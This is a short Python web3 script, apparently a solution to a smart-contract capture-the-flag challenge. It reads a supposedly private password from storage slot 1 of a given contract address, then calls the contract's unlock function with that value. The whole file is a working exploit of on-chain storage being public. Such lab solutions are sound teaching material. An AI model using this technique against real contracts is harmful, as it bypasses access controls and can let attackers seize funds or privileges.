from commom import get_w3

TARGET_ADDRESS = '0xC23C726042dC26def39a4C973C73fCBd01B514E5'

abi = [{"inputs": [
        {
            "name": "_password",
            "type": "bytes32"
        }
    ],
    "name": "unlock",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}]

def main():
    w3 = get_w3()
    password = w3.eth.get_storage_at(TARGET_ADDRESS, 1)
    contract = w3.eth.contract(address=TARGET_ADDRESS, abi=abi)
    tx = contract.functions.unlock(password).transact()
    receipt = w3.eth.wait_for_transaction_receipt(tx)
    print(receipt.status)

if __name__ == '__main__':
    main()
